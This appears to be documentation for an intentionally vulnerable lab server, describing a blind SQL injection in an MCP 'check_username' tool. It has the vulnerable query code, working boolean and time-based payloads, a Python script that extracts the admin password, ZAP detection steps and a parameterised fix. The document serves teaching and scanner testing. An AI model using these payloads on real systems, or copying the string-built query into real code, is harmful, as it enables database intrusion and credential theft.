# Blind SQL Injection — CWE-89

## Description

The `check_username` tool is vulnerable to SQL injection, but unlike `search_users` it
suppresses all error output and returns only a boolean string (`"true"` or `"false"`).
Error-based and UNION-based extraction do not work. An attacker must use **boolean-based
blind injection**: craft payloads that make the query return a different boolean for a
true condition vs a false condition, then infer one character of data at a time.

## CWE

[CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)

## Vulnerable Code

```python
# tools/sqli_blind.py
query = f"SELECT COUNT(*) FROM users WHERE name = '{username}'"
try:
    cur = db.execute(query)
    count = cur.fetchone()[0]
    return "true" if count > 0 else "false"
except sqlite3.Error:
    return "false"   # errors silently swallowed — only the boolean leaks
```

## Example MCP Call

```bash
curl -s http://localhost:8000/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"check_username","arguments":{"username":"alice"}},"id":1}'
```

Normal response (`"true"` = user exists):

```json
{"jsonrpc":"2.0","id":1,"result":{"content":[{"type":"text","text":"true"}],"isError":false}}
```

## Payloads

### 1. Confirm injection point

```
' OR '1'='1' --
```

Returns `"true"` even though no user is named `' OR '1'='1' --`. Proves the injection
point is active.

```bash
curl -s http://localhost:8000/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{"jsonrpc":"2.0","method":"tools/call","params":{"name":"check_username","arguments":{"username":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --"}},"id":2}'
```

### 2. Boolean character extraction — test if admin password starts with `S`

```
' OR (SELECT CASE WHEN substr(password,1,1)='S' THEN 1 ELSE 0 END FROM users WHERE name='admin')='1' --
```

Returns `"true"` if the first character of `admin`'s password is `S`; `"false"` otherwise.

### 3. Full password extraction — iterate position and character

Repeat the payload for each position `{n}` and candidate character `{c}`:

```
' OR (SELECT CASE WHEN substr(password,{n},1)='{c}' THEN 1 ELSE 0 END FROM users WHERE name='admin')='1' --
```

Automate with a script:

```python
import requests, string

URL = "http://localhost:8000/mcp"
CHARS = string.ascii_letters + string.digits + string.punctuation

def check(payload):
    r = requests.post(URL, json={
        "jsonrpc": "2.0", "method": "tools/call",
        "params": {"name": "check_username", "arguments": {"username": payload}},
        "id": 1,
    })
    return r.json()["result"]["content"][0]["text"] == "true"

password = ""
for n in range(1, 20):
    found = False
    for c in CHARS:
        payload = (
            f"' OR (SELECT CASE WHEN substr(password,{n},1)='{c}' "
            f"THEN 1 ELSE 0 END FROM users WHERE name='admin')='1' --"
        )
        if check(payload):
            password += c
            found = True
            break
    if not found:
        break

print(f"admin password: {password}")
# → admin password: Sup3rS3cr3t!
```

### 4. Time-based blind injection (SQLite recursive CTE delay)

```
' OR (SELECT CASE WHEN substr(password,1,1)='S'
      THEN (SELECT COUNT(*) FROM (WITH RECURSIVE r(x) AS
            (SELECT 1 UNION ALL SELECT x+1 FROM r WHERE x<5000000) SELECT x FROM r))
      ELSE 0 END FROM users WHERE name='admin')>0 --
```

If the condition is true the response is noticeably delayed; false returns immediately.

## Expected Response

Normal call: `"true"` or `"false"`.  
Injection confirmation payload: always `"true"`.  
Errors: always `"false"` — errors are swallowed, making the channel blind.

## ZAP Detection

ZAP's active scanner should:

1. Send `' OR '1'='1' --` as the `username` value.
2. Observe the response flips from `"false"` (non-existent user) to `"true"`.
3. Apply boolean differential analysis: one payload always returns `"true"`, the
   complementary always returns `"false"`.
4. Flag: **Blind SQL Injection (Boolean-based)**.

## Secure Fix

Use parameterised queries:

```python
query = "SELECT COUNT(*) FROM users WHERE name = ?"
cur = db.execute(query, (username,))
```
